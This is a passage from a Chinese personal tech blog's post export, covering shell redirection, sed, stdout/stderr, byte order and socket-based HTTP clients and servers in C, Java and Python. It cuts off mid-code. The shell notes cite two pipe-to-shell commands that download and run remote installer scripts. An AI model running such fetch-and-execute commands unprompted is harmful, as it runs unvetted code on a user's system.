Shell(ash)。Ubuntu中将默认shell改为dash的主要原因是效率。由于Ubuntu启动过程中需要启动大量的shell脚本，为了优化启动速度和资源使用情况，Ubuntu做了这样的改动。 shell脚本执行的时候不是可以带参数$0, $1什么的嘛这实质上就是一个数组 #!/bin/bash echo &quot;The script you are running has basename `basename &quot;$0&quot;`, dirname `dirname &quot;$0&quot;`&quot; echo &quot;The present working directory is `pwd`&quot; echo &quot;参数个数为：$#&quot;; ## 传进来的参数的个数 echo &quot;传递的参数作为一个字符串显示：$*&quot;; ## 就是把所有参数作为一整个字符串打印出来 echo &quot;-- \\$@ 传入的参数 ---&quot; for i in &quot;$@&quot;; do echo $i done 在c语言的main函数中,args[0]就是当前文件的路径，所以在shell里也差不多 在sh脚本中判断当前脚本所在的位置) shell中的重定向大于号是输出重定向，小于号是输入重定向 输入重定向就好玩了直接把一个curl的脚本导到bash去执行的方式 - bash &lt;(curl -L -s https://install.direct/go.sh) $ curl get.pow.cx | sh ##我也见过这种的 $ wc -l &lt; users ## 假设这个users文件里就两行 2 讲的深入一点一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件：标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。如果希望将 stdout 和 stderr 合并后重定向到 file，可以这样写： $ command &gt; file 2&gt;&amp;1 ## 印象中这是把2导到1中 ##或者 $ command &gt;&gt; file 2&gt;&amp;1 here documentHere Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序。 它的基本的形式如下： command &lt;&lt; delimiter document delimiter 它的作用是将两个 delimiter 之间的内容(document) 作为输入传递给 command。(说人话就是有段命令特别长，塞到这里头就方便看了)注意：结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进。开始的delimiter前后的空格会被忽略掉。 linux shell 的here document 用法 (cat &lt;&lt; EOF) :&lt;&lt;EOF 注释内容... 注释内容... 注释内容... EOF //统计一下这个脚本耗时多久 time bash -c ‘echo “hey”‘time somescript.sh shell脚本里面经常会看到mktemp函数，作用就是确保生成一个随机命名的文件 一行行的读取一个文件#!/bin/bash file=&quot;/home/vivek/data.txt&quot; while IFS= read -r line do # display $line or do somthing with $line printf &#39;%s\\n&#39; &quot;$line&quot; done &lt;&quot;$file&quot; awk有一个比较坑的地方是在执行命令的语句中只能写print,printf这种awk自带的函数 echo &quot;A B C&quot; | awk &#39;{split($0,a,&quot; &quot;);for(i in a){ if(i == NF){ print a[1] } else { print a[i+1] }}}&#39; //NF是最后一行的意思 得到输出BCA awk的命令里面要想调用一个系统函数，比方说ls，或者自己的一个shell function，得这么写 awk &#39;{printf(&quot;%s &quot;,$1); system(&quot;d2h &quot; $2)}&#39; file 直接挑选几个可以用的脚本开始看吧 一个把文件夹（/public/imgs）下所有文件重命名为img-x.jpg的shell脚本 #!/bin/bash FORMAT_JPG=&quot;jpg&quot; FORMAT_JPEG=&quot;jpeg&quot; index=1 dir=$(eval pwd)/public/imgs ALLIMGES=$(ls $dir | grep &quot;.$FORMAT_JPEG\\|.$FORMAT_JPG&quot;) for file in $ALLIMGES do name=img-${index}.jpg echo renaming $dir/$file to $dir/$name mv $dir/$file $dir/$name ((index++)) # name=$(ls $file | cut -d. -f1) # mv $dir/public/imgs/$file ${name}.$suffix done echo &quot;renaming $index image files =====&gt; x.jpg done!&quot; 同时grep多种文件的时候，比如又想要jpg又想要jpeg的话，grep 要加上反斜杠，或者下面这三种 grep &quot;aaa\\|bbb&quot; grep -E &quot;aaa|bbb&quot; grep -E aaa\\|bbb how to grep 一个直接把gfwlist的bs64文本转换成dnsmasq配置文件的脚本 注意，base64在linux上是预装的 检查当前系统中依赖的软件是否都装了check_depends(){ which sed base64 mktemp &gt;/dev/null if [ $? != 0 ]; then ## 美元加问号就是上一个命令的返回值 _red &#39;Error: Missing Dependency.\\nPlease check whether you have the following binaries on you system:\\nwhich, sed, base64, mktemp.\\n&#39; exit 3 fi which curl &gt;/dev/null if [ $? != 0 ]; then which wget &gt;/dev/null if [ $? != 0 ]; then _red &#39;Error: Missing Dependency.\\nEither curl or wget required.\\n&#39; exit 3 fi USE_WGET=1 ## 随便定义一个变量 else USE_WGET=0 fi SYS_KERNEL=`uname -s` if [ $SYS_KERNEL = &quot;Darwin&quot; -o $SYS_KERNEL = &quot;FreeBSD&quot; ]; then ## if 语句里面or是就是-o，短路与是-a BASE64_DECODE=&#39;base64 -D&#39; SED_ERES=&#39;sed -E&#39; else BASE64_DECODE=&#39;base64 -d&#39; SED_ERES=&#39;sed -r&#39; fi } opt-scriptshell script tutorialLINUX下的21个特殊符号Shell学习笔记非常好的shell介绍网站shell中各种括号的作用()、(())、[]、[[]]、{}","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"linux常用命令(三)","date":"2018-11-04T08:44:22.000Z","path":"2018/11/04/2018-11-04-linux-affiliated-commands/","text":"linux sed命令basic sed sed operates on a stream of text that it reads from either standard input or from a file. 基本命令格式sed [options] commands [file-to-edit] 默认情况下,sed会把结果输出到standoutput里面sed ‘’ BSD ##等同于catcat BSD | sed ‘’ ##操作cat的输出流sed ‘p’ BSD ##p是命令，明确告诉它要去print，这会导致每一行都被打印两遍sed -n ‘p’ BSD ##我不希望你自动打印，每行只被打印一遍sed -n ‘1p’ BSD ##只打印第一行sed -n ‘1,5p’ BSD ##打印前5行sed -n ‘1,+4p’ BSD ##这个也是打印前五行sed -n ‘1~2p’ BSD ##every other line，打印一行跳过一行，从第一行开始算sed ‘1~2d’ BSD ##也是隔一行进行操作，只不过这里的d表示删除，结果就是1，3，5…行被从cat的结果中删掉 默认情况下,sed不会修改源文件，加上-i就能改了sed -i ‘1~2d’ everyother.txt ##第1，3，5，…行被删掉sed -i.bak ‘1~2d’ everyother.txt ##在编辑文件之前保存一份.bak文件作为备份 sed最为常用的命令就是substituting text了echo “http://www.example.com/index.html“ | sed ‘s_com/indexorg/home‘http://www.example.org/home.html 命令是这么用的,首先s表示substitute‘s/old_word/new_word/‘ 准备好这么一份text文件echo “this is the song that never endsyes, it goes on and on, my friendsome people started singing itnot knowing what it wasand they’ll continue singing it foreverjust because…” &gt; annoying.txt sed ‘s/on/forward/‘ annoying.txt ##把所有的on换成forward，同时打印出结果。但如果当前行已经替换过一次了，就跳到下一行。所以可能没有替换干净 sed ‘s/on/forward/g’ annoying.txt ## 加上g就好了sed ‘s/on/forward/2’ annoying.txt ##每一行只替换第二个匹配上的sed -n ‘s/on/forward/2p’ annoying.text ## n是supress自动print，只打印出哪些被换了的sed ‘s/SINGING/saying/i’ annoying.txt ##希望大小写不敏感sed ‘s/^.at/REPLACED/‘ annoying.txt ##从每一行的开头到”at”sed ‘s/^.at/(&amp;)/‘ annoying.txt ## 把那些会匹配上的文字用括号包起来 intermediate training linux下查看一个文件的时间戳 stat test c语言下对应的函数在sys/stat.h头文件中 #include &lt;stdio.h&gt; #include &lt;sys/stat.h&gt; int main(void){ struct stat filestat; stat(&quot;/etc/sysctl.conf&quot;, &amp;filestat); printf(&quot;size: %ld bytes, uid: %d, gid: %d, mode: %#o\\n&quot;, filestat.st_size, filestat.st_uid, filestat.st_gid, filestat.st_mode); return 0; } windows的换行符是 \\r\\l，linux的是 \\l，mac的是 \\r从根本上讲，二进制文件和文本文件在磁盘中没有区别，都是以二进制的形式存储二进制和文本模式的区别在于对换行符和一些非可见字符的转化上，如非必要，是使用二进制读取会比较安全一些 换行和回车在不同平台上的解释 Dos 和 windows 采用“回车+换行，CR/LF”表示下一行；UNIX/Linux 采用“换行符，LF”表示下一行；苹果机(MAC OS 系统)则采用“回车符，CR”表示下一行。CR 用符号’\\r’表示, 十进制ASCII代码是 13, 十六进制代码为 0x0D;LF 使用’\\n’符号表示，ASCII代码是 10, 十六制为 0x0A。所以 Windows 平台上换行在文本文件中是使用 0d 0a 两个字节表示，而 UNIX 和苹果平台上换行则是使用 0a 或 0d 一个字节表示。一般操作系统上的运行库会自动决定文本文件的换行格式，如一个程序在 windows 上运行就生成 CR/LF 换行格式的文本文件，而在 Linux 上运行就生成 LF 格式换行的文本文件。在不同平台间使用 FTP 软件传送文件时，在 ASCII 文本模式传输模式下， 一些 FTP 客户端程序会自动对换行格式进行转换，经过这种传输的文件字节数可能会发生变化，如果你不想 FTP 修改原文件，可以使用 bin 模式（二进制模式）传输文本。在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33，Linux/Unix下的tty概念也来自于此）的玩意，每秒钟可以打 10 个字符。但是它有一个问题，就是打完一行换行的时候，要用去0.2秒，正好可以打两个字符。要是在这 0.2 秒里面，又有新的字符传过来，那么这个字符将丢失。于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做“回车”，告诉打字机把打印头定位在左边界；另一个叫做“换行”，告诉打字机把纸向下移一行。这就是“换行”和“回车”的来历，从它们的英语名字上也可以看出一二。后来，计算机发明了，这两个概念也就被搬到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了，加一个就可以。于是，就出现了分歧。Unix系统里，每行结尾只有“&lt;换行&gt;”，即”\\n”；Mac系统里，每行结尾是“&lt;回车&gt;”，即”\\r”；Windows系统里面，每行结尾是“&lt;换行&gt;&lt;回车 &gt;”，即“\\n\\r”。一个直接后果是，Unix/Mac系统下的文件在 Windows里打开的话，所有文字会变成一行；而Windows里的文件在Unix/Mac下打开的话，在每行的结尾可能会多出一个^M符号。 因为 Windows 和 Linux 中的换行符不一致，前者使用CRLF(即\\r\\n)表示换行，后者则使用LF(即\\n)表示换行而C语言本身使用LF(即\\n)表示换行，所以在文本模式下，需要转换格式(如Windows)，但是在 Linux 下，文本模式和二进制模式就没有什么区别 另外，以文本方式打开时，遇到结束符CTRLZ(0x1A)就认为文件已经结束所以，若使用文本方式打开二进制文件，就很容易出现文件读不完整，或內容不对的错误即使是用文本方式打开文本文件，也要谨慎使用，比如复制文件，就不应该使用文本方式 signal处理HakTip - Linux Terminal 101: Controlling Processes linux上信号有32种，多数在C语言中都有默认的处理方式（并且这种默认的处置方式也是可以更改的），除了SIGKILL(强行terminate)和SIGSTOP(debug遇到断点)不允许开发者更改处理方式。(kill -9也就是强杀非常有效)c程序可以通过signal(比较老了)函数或者sigaction(推荐)函数注册收到信号之后的动作 Linux by default use the RAM as disk cache这里的回答解释了系统会默认在内存中缓存磁盘节点的信息，下一次进行find的操作时候，就会快很多。 linux上使用 Ctrl-R 而不是上下键搜索历史 shell里面的重定向 Standard output到底是个什么玩意 Every Unix-based operating system has a concept of “a default place for output to go”. Since that phrase is a mouthful, everyone calls it “standard output”, or “stdout”, pronounced standard out. Your shell (probably bash or zsh) is constantly watching that default output place. When your shell sees new output there, it prints it out on the screen so that you, the human, can see it. Otherwise echo hello would send “hello” to that default place and it would stay there forever. Standard input (“stdin”, pronounced standard in) is the default place where commands listen for information. For example, if you type cat with no arguments, it listens for input on stdin, outputting what you type to stdout, until you send it an EOF character (CTRL+d): Standard errorStandard error (“stderr”) is like standard output and standard input, but it’s the place where error messages go. To see some stderr output, try catting a file that doesn’t exist: $ cat does-not-exist | sed ‘s/No such/ROBOT SMASH/‘cat: does-not-exist: No such file or directoryWhoa - nothing changed! Remember, pipes take the stdout of the command to the left of the pipe. cat‘s error output went to stderr, not stdout, so nothing came through the pipe to sed. It’s good that stderr doesn’t go through the pipe by default: when we pipe output through something that doesn’t output stdout to the terminal, we still want to see errors immediately. For example, imagine a command that reads stdin and sends it to the printer: you wouldn’t want to have to walk over to the printer to see its errors.We need to redirect cat’s stderr to stdout so that it goes through the pipe. And that means we need to learn about redirecting output. unix下redirect file descriptorRedirecting outputA file descriptor, or FD, is a positive integer that refers to an input/output source. For example, stdin is 0, stdout is 1, and stderr is 2. Those might seem like arbitrary numbers, because they are: the POSIX standard defines them as such, and many operating systems (like OS X and Linux) implement at least this part of the POSIX standard. echo “hello there” &gt;&amp;2 // 这句话本来是应该显示在stdoutput中的，但是这里重定向到stderr了,可以把stderr这种看做特殊的file descriptor了。重定向的时候箭头后面要跟一个&amp;号。 下面这个例子，因为pipe默认是只监视stdout的, 送往stderr的东西是没有影响的 Redirect to stdout, so it comes through the pipe$ echo “no changes” &gt;&amp;1 | sed “s/no/some/“some changes Redirect to stderr, so it does not come through$ echo “no changes” &gt;&amp;2 | sed “s/no/some/“no changes 但是，对于zsh用户，由于zsh默认打开了MULTIOS option。 This is due to ZSH’s MULTIOS option, which is on by default. The MULTIOS option means that echo something &gt;&amp;1 | other_command will output to FD 1 and pipe the output to other_command, rather than only piping it. To turn this off, run unsetopt MULTIOS. # ZSH with MULTIOS option on $ echo &quot;hello there&quot; &gt;&amp;1 | sed &quot;s/hello/hi/&quot; hi there //要是Bash的话，这一行就不会出现，第一个命令的输出直接被Pipe到下一个命令的输入了，都不会显示 hi there $ echo &quot;hello there&quot; &gt;&amp;2 | sed &quot;s/hello/hi/&quot; hello there hi there Let’s say you have stderr output mingled with stdout output – perhaps you’re running the same command over many files, and the command may output to stdout or stderr each time. For convenience, the command outputs “stdout” to stdout, and “stderr” to stderr, plus the file name. The visual output looks like this: $ ./command file1 file2 file3stdout file1stderr file2stdout file3We want to transform every line to have “Robot says: ” before it, but just piping the command to sed won’t work, because (again) pipes only grab stdout:$ ./command file1 file2 file3 | sed “s/^/Robot says: /“stderr file2Robot says: stdout file1Robot says: stdout file3This is a common use case for file descriptors: redirect stderr to stdout to combine stderr and stdout, so you can pipe everything as stdout to another process.Let’s try it:$ ./command file1 file2 file3 2&gt;&amp;1 | sed “s/std/Robot says: std/“Robot says: stderr file2Robot says: stdout file1Robot says: stdout file3 It worked! We successfully redirected stderr (FD 2) into stdout (FD 1), combining them and sending the combined output through stdout.这下知道nohup xxx &gt; /dev/null 2&gt;&amp;1 &amp; 是什么意思了吧(&gt;dev/null是无底洞的意思， 2&gt;&amp;1 是吧file descriptor 2也就是stderr重定向到file descriptor 1也就是stdout , &amp; 是后台运行的意思) # Correct &gt; log-file 2&gt;&amp;1 # Wrong 2&gt;&amp;1 &gt; log-file The correct version points stdout at the log file, then redirects stderr to stdout, so both stderr and stdout point at the log file. The wrong version points stderr at stdout (which outputs to the shell), then redirects stdout to the file. Thus only stdout is pointing at the file, because stderr is pointing to the “old” stdout. Another common use for redirecting output is redirecting only stderr. To redirect a file descriptor, we use N&gt;, where N is a file descriptor. If there’s no file descriptor, then stdout is used, like in echo hello &gt; new-file.We can use this new syntax to silence stderr by redirecting it to /dev/null, which happily swallows whatever it receives and does nothing with it. It’s the black hole of input/output. Let’s try it: Redirect stdout, because it’s plain &gt;$ ./command file1 file2 file3 &gt; log-filestderr file2 Redirect stderr, because it’s 2&gt;$ ./command file1 file2 file3 2&gt; log-filestdout file1stdout file3 比方说这个命令/tmp/test.sh &gt; /tmp/test.log 2&gt;&amp;1执行sh脚本，输出到log文件中，把错误信息也写进文件所以经常看到的nohup /mnt/Nand3/H2000G &gt;/dev/null 2&gt;&amp;1 &amp;就是把输出丢进垃圾桶，跟着把错误也丢进垃圾桶，后面那个是后台运行的意思 使用 dmesg 来查看一些硬件或驱动程序的信息或问题。感觉像是查看系统启动日志 文件夹/sys/devices/system/cpu就是对cpu的文件映射。进入以后，随便进一个cpu核，可以看到cache文件夹，tree以后： . ├── index0 │ ├── coherency_line_size │ ├── level │ ├── number_of_sets │ ├── physical_line_partition │ ├── shared_cpu_list │ ├── shared_cpu_map │ ├── size │ ├── type │ └── ways_of_associativity ├── index1 │ ├── coherency_line_size │ ├── level │ ├── number_of_sets │ ├── physical_line_partition │ ├── shared_cpu_list │ ├── shared_cpu_map │ ├── size │ ├── type │ └── ways_of_associativity ├── index2 │ ├── coherency_line_size ...同上一个文件夹 │ └── ways_of_associativity └── index3 ├── coherency_line_size ...同上一个文件夹 └── ways_of_associativity","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"网络传输的字节序问题","date":"2018-11-03T10:38:04.000Z","path":"2018/11/03/2018-11-03-idea-byte-endianness/","text":"字节序（Endianness），在计算机科学领域中，是跨越多字节的程序对象的存储规则。 首先确认下c语言下基本数据类型大小printf(&quot;sizeof(int)= %ld\\n&quot;,sizeof(int)); printf(&quot;sizeof(char)= %ld\\n&quot;,sizeof(char)); printf(&quot;sizeof(long)= %ld\\n&quot;,sizeof(long)); printf(&quot;sizeof(float)= %ld\\n&quot;,sizeof(float)); printf(&quot;sizeof(short)= %ld\\n&quot;,sizeof(short)); sizeof(int)= 4sizeof(char)= 1sizeof(long)= 8sizeof(float)= 4sizeof(short)= 2 来看一下c语言这边用socket以int，long的形式发送数据，Python这边接收会是怎么样的c语言的server长这样 #include &lt;stdio.h&gt; #include &lt;netinet/in.h&gt; #include &lt;sys/socket.h&gt; // socket #include &lt;sys/types.h&gt; // 基本数据类型 #include &lt;unistd.h&gt; // read write #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // open close #include &lt;sys/shm.h&gt; #include &lt;signal.h&gt; #define PORT 7037 #define SERV &quot;0.0.0.0&quot; #define QUEUE 20 #define BUFF_SIZE 1024 int sockfd; int main(int argc,char *argv[ ]){ signal(SIGINT,handle_signal); int count = 0; // 计数 // 定义 socket sockfd = socket(AF_INET,SOCK_STREAM,0); // 定义 sockaddr_in struct sockaddr_in skaddr; skaddr.sin_family = AF_INET; // ipv4 skaddr.sin_port = htons(PORT); skaddr.sin_addr.s_addr = inet_addr(SERV); // bind，绑定 socket 和 sockaddr_in if( bind(sockfd,(struct sockaddr *)&amp;skaddr,sizeof(skaddr)) == -1 ){ perror(&quot;bind error&quot;); exit(1); } // listen，开始添加端口 if( listen(sockfd,QUEUE) == -1 ){ perror(&quot;listen error&quot;); exit(1); } // 客户端信息 char buff[BUFF_SIZE]; struct sockaddr_in claddr; socklen_t length = sizeof(claddr); while(1){ int sock_client = accept(sockfd,(struct sockaddr *)&amp;claddr, &amp;length); printf(&quot;%d\\n&quot;,++count); if( sock_client &lt;0 ){ perror(&quot;accept error&quot;); exit(1); } int a[3]={1,2,3}; //在这里发送出byte数组 send(sock_client,(char*)a,sizeof(a),0); close(sock_client); } fputs(&quot;have a nice day&quot;,stdout); close(sockfd); return 0; } python的client长这样： #!/usr/bin/python # -*- coding: UTF-8 -*- import socket # 创建一个socket: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 建立连接: s.connect((&#39;192.168.1.45&#39;, 7037)) s.send(b&#39;GET / HTTP/1.1\\r\\nHost: www.sina.com.cn\\r\\nConnection: close\\r\\n\\r\\n&#39;) # 接收数据: buffer = [] while True: d = s.recv(1) ##其实这里应该是有误区的，，recv并不是从socket里直接读数据，recv只是从tcp的buffer中(已经帮我们转成了小端，所以这事应该得抓包才能看懂） t = &#39;&#39; for x in d: print(format(x,&#39;b&#39;)) if d: buffer.append(d) else: break data = b&#39;&#39;.join(buffer) print(data) s.close() 在局域网内的两台电脑,server跑在mac上,client跑在win10client这边打印出了 1 0 0 0 ===我是四个byte等于一个int的手动分割线=== 10 0 0 0 ===我是四个byte等于一个int的手动分割线=== 11 0 0 0 前四个字节是”1”1 0 0 00 0 0 1 -&gt; 显然是1 中间四个字节是”2”10 0 0 00 0 0 10 -&gt; 显然是2 最后四个字节是”3”11 0 0 00 0 0 11 -&gt; 显然是3 这个实验其实没有证明什么，c语言端发出的int[3] = {1, 2, 3}在走tcp层的时候其实是[0001, 0002, 0003]这么发的，达到达客户端的时候，客户端的tcp buffer收到了之后手动把每个转成小端[1000, 2000,3000] ，应用层程序读取的时候是从这个buffer里面读取的 这里如果把c语言的server改一下 float a[3]={1,2,3}; //在这里发送出byte数组 send(sock_client,(char*)a,sizeof(a),0); client一字不改，得到的是 0 0 10000000 111111 ===我是四个byte等于一个float的手动分割线=== 0 0 0 1000000 ===我是四个byte等于一个float的手动分割线=== 0 0 1000000 1000000 这个其实跟float是如何表示小数有关了，float有几个bit是专门给小数点后面的数值和指数准备的。float是4个byte，这32位是这么分的：1bit（符号位） 8bits（指数位） 23bits（尾数位）（内存中就长这样） 改成long呢，short呢？改成long 1 0 0 0 0 0 0 0 ===我是八个byte等于一个long的手动分割线=== 10 0 0 0 0 0 0 0 ===我是八个byte等于一个long的手动分割线=== 11 0 0 0 0 0 0 0 问题已经很清楚了。上述是把数字当做int,long,float这种数据类型来发送，但如果是把123这三个数字当做”123”这种字符串，数字1其实只用一个byte(utf-8下)就解决了，也就不存在什么字节序的问题了 如C编写的进程和Java编写的进程间通信，(JVM也是大端）。在主机和网络字节序的互相转化主要涉及IP地址和端口。c语言写server要老老实实去转换ip地址和端口的字节序，这也是为了遵守规范 #include &lt;netstat/in.h&gt; unsigned long int htonl(unsigned long int hostlong); unsigned short int htons(unsigned short int hostshort); unsigned long int ntohl(unsigned long int netlong); unsigned short int ntohs(unsigned short int netshort); 网络字节序是一种规定，它规定了传输的数据应该按照大端，因为通信双方的字节序其实是不确定的，但是按照规定我们都认为接收到的数据都是大端，即遵守规定的顺序，这样老老实实地通过htons系列函数处理格式化的数据（如int）保证了不会出现任何错误。 但是，我们自己写的C/S因为都是小端，所以即使没有遵守规定，依然可以用，但这样并不规范，有潜在的隐患。 而对于IP地址或者端口，因为这些数据的处理全部是在应用层以下，是路由器，网卡进行处理，它们在设计时自然遵守规定全部依照网络字节序对数据进行处理，而你自己不把IP地址转换顺序，交给下层处理时自然会出错。 所以，在应用层，也应该遵守规定，对于int double 这样的数据也应该转换字节序，当然字符串也挺好（这大概也就是Json的优势了，而像protobuf这种传输时就要注意顺序）。 抓包看ip地址字节序转换utf-8还有一个byte-order-mark(bom)的问题 C语言下可以把一个byte按照binary的方式打印出来(就是把一个byte的每一个bit输出来),int也可以。 #include &lt;stdio.h&gt; #include &lt;limits.h&gt; void print_bin(unsigned char byte) { int i = CHAR_BIT; /* however many bits are in a byte on your platform */ while(i--) { putchar(&#39;0&#39; + ((byte &gt;&gt; i) &amp; 1)); /* loop through and print the bits */ } printf(&quot;\\n\\n&quot;); } void print_bin_int(unsigned int integer) { int i = CHAR_BIT * sizeof integer; /* however many bits are in an integer */ while(i--) { putchar(&#39;0&#39; + ((integer &gt;&gt; i) &amp; 1)); } printf(&quot;\\n\\n&quot;); } int checkCPUendian() { union { unsigned int a; unsigned char b; }c; c.a = 1; printf(&quot;a = %a , b= %a \\n&quot;,c.a , c.b); printf(&quot;a = %X , b= %X \\n&quot;,c.a , c.b); printf(&quot;a = %p , b= %p \\n&quot;,c.a , c.b); printf(&quot;a = %u , b= %u \\n&quot;,c.a , c.b); print_bin(c.b); print_bin_int(c.a); return (c.b == 1); } int main(int argc, char const *argv[]) { if(checkCPUendian()){ printf(&quot;Little endian platform!\\n&quot;); } else { printf(&quot;Big Endian platform!\\n&quot;); } return 0; } 输出，这里是从高地址内存开始往低地址的内存读取 a = 0x0.07fcbc8474a98p-1022 , b= 0x0p+0 a = 1 , b= 1 a = 0x1 , b= 0x1 a = 1 , b= 1 00000001 00000000000000000000000000000001 Little endian platform!","tags":[]},{"title":"读物","date":"2018-10-28T21:43:40.000Z","path":"2018/10/28/2018-10-28-idea-for-good-reading/","text":"好的博客，好的文章的收藏夹 Linux C编程一站式学习 author of netty死磕java技术小黑屋Jerry Qu 专注 WEB 端开发 非常非常全的关于python socket编程的文章，文章本身也很长 关于c语言写的很好的博客关于网络基本功的 how hackers start their afternoons. 很像medium的一个网站 Linux 信号处理 icymind 关于linux的任何事jvm,java技术相关的tcp进阶 Andriod系统的文章写得很深","tags":[{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"netty及nio知识手册","date":"2018-10-13T21:34:19.000Z","path":"2018/10/13/2018-10-13-netty-and-nio-intro/","text":"都说netty要比nio好用，先从官方的intro page看起。 ByteBuff是reference counted的，netty的作者说：java给人一种不需要清理garbage的illusionallocating stuff is no big deal , garbage collecting it is. Vertx，是一个基于JVM、轻量级、高性能的应用平台，非常适用于移动端后台、互联网、企业应用架构。vertx框架底层基于netty，也是异步io，selector那一套 netty的example非常多，http2,cors,upload等等都有 Netty - One Framework to rule them all by Norman Maurernetty best practices with norman maurer","tags":[{"name":"nio","slug":"nio","permalink":"https://haldir65.github.io/tags/nio/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"从Socket入手实现http协议","date":"2018-10-13T21:30:36.000Z","path":"2018/10/13/2018-10-13-implementing-http-server-via-socket/","text":"收集几种语言中使用socket实现httpServer和httpClient的主要步骤 OSI七层网络体系结构 ： 物理层(IEEE 802.2)、数据链路层(ARP,RARP)、网络层(ip,icmp)、传输层(tcp,udp)、表示层、会话层(SSL,TLS)、应用层(HTTP,FTP,SMTP,POP3).这里面Socket比较特殊，Socket是一组编程接口（API）。介于传输层和应用层，向应用层提供统一的编程接口。应用层不必了解TCP/IP协议细节,直接通过对Socket接口函数的调用完成数据在IP网络的传输。SOCKET 算不上是个协议，应该是应用层与传输层间的一个抽象层，是个编程接口。 tcp包结构是不包含ip地址的，只有source port(2个byte)和destination port(65536这么来的)的. ip address是ip层的工作。 HTTP 1.1的RFC非常长 在 OSI 的七层协议中，第二层（数据链路层）的数据叫「Frame」，第三层（网络层）上的数据叫「Packet」，第四层（传输层）的数据叫「Segment」。(在wireShark的抓包结果就是这么展示的) tcp包结构，udp的也有 java用java实现一个httpclient怎么样? public class HttpSocketClient { private Socket mSocket; public static void main(String[] args) { HttpSocketClient client = new HttpSocketClient(); try { client.sendGet(&quot;www.baidu.com&quot;,80,&quot;/&quot;); } catch (IOException e) { e.printStackTrace(); } } public HttpSocketClient() { this.mSocket = new Socket(); } /** 在百度服务器面前，这就是一个正常的浏览器 * @param host * @param port * @param path * @throws IOException */ void sendGet(String host, int port, String path) throws IOException { SocketAddress dest = new InetSocketAddress(host, port); mSocket.connect(dest); OutputStreamWriter streamWriter = new OutputStreamWriter(mSocket.getOutputStream()); BufferedWriter bufferedWriter = new BufferedWriter(streamWriter); bufferedWriter.write(&quot;GET &quot; + path + &quot; HTTP/1.1\\r\\n&quot;); bufferedWriter.write(&quot;Host: &quot; + host + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;Connection: &quot; + &quot;keep-alive&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;User-Agent: &quot; + &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;Accept: &quot; + &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;Accept-Language: &quot; + &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;\\r\\n&quot;); bufferedWriter.flush(); //flush一下很重要，等于说已经写完了 BufferedInputStream stream = new BufferedInputStream(mSocket.getInputStream()); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream)); String line = null; while ((line = bufferedReader.readLine())!=null) { System.out.println(line); } bufferedReader.close(); bufferedWriter.close(); mSocket.close(); } } 输出 HTTP/1.1 302 Moved Temporarily Date: Sat, 24 Mar 2018 06:44:20 GMT Content-Type: text/html Content-Length: 225 Connection: Keep-Alive Set-Cookie: BAIDUID=259D5F393E329E8E44651C589037C093:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com Set-Cookie: BIDUPSID=259D5F393E329E8E44651C589037C093; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com Set-Cookie: PSTM=1521873860; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com Set-Cookie: BD_LAST_QID=10107339987852007720; path=/; Max-Age=1 P3P: CP=&quot; OTI DSP COR IVA OUR IND COM &quot; Location: https://www.baidu.com/ Server: BWS/1.1 X-UA-Compatible: IE=Edge,chrome=1 &lt;html&gt; &lt;head&gt;&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor=&quot;white&quot;&gt; &lt;center&gt;&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;65d90fa34a5e777be72b3e20c859c335f9198cc2 Time : Thu Mar 15 16:20:59 CST 2018&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 当然因为访问的是http，302是临时重定向（另外，几乎没见过谁返回301的，301的结果会被浏览器缓存），注意上面返回了Location字段，所以是符合规范的 server这边普遍用的是netty，正好netty的官网上也有相关的教程.netty的example非常多，http2,cors,upload等等都有 Python我自己抄来的简易版 ## server import socket import re import os import codecs,logging sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.bind((HOST, 18004)) sock.listen(100) # infinite loop while True: # maximum number of requests waiting conn, addr = sock.accept() request = conn.recv(1024) if isinstance(request,bytes): request = str(request) logging.error(request) splited = request.split(&#39; &#39;) if(len(splited)&lt;2): continue method = request.split(&#39; &#39;)[0] src = request.split(&#39; &#39;)[1] print(&#39;Connect by: &#39;, addr) print(&#39;Request is:\\n&#39;, request) # deal wiht GET method if method == &#39;GET&#39; or method.__contains__(&#39;GET&#39;): if src == 